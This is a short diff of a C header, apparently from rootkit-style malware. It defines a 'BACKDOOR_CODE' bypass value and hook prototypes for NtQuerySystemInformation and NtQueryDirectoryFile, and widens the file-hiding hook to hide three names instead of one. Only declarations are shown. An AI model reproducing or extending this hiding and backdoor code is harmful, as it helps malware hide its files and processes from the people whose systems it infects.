@@ -1,4 +1,5 @@
 #define BACKDOOR_CODE 0xABADC0DE // Usato per far richiamare le funzioni senza hiding
+#define HIDE_NAME_COUNT 3
 
 typedef struct {
 	COMMONDATA;
@@ -9,7 +10,7 @@ PROTOTYPE_HOOK(NTSTATUS, H_NtQuerySystemInformation, SYSTEM_INFORMATION_CLASS Sy
 
 typedef struct {
 	COMMONDATA;
-	WCHAR name_to_hide[MAX_RAND_NAME];
+	WCHAR name_to_hide[HIDE_NAME_COUNT][MAX_RAND_NAME];
 } H_NtQueryDirectoryFileStruct;
 PROTOTYPE_HOOK(NTSTATUS, H_NtQueryDirectoryFile, HANDLE FileHandle, HANDLE Event, PVOID ApcRoutinte, PVOID ApcContext, PVOID IoStausBlock, BYTE *FileInformation, ULONG FileInformationLength, LONG FileInformationClass, BOOL ReturnSingleEntry, PVOID FileMask, BOOL RestartScan);
 
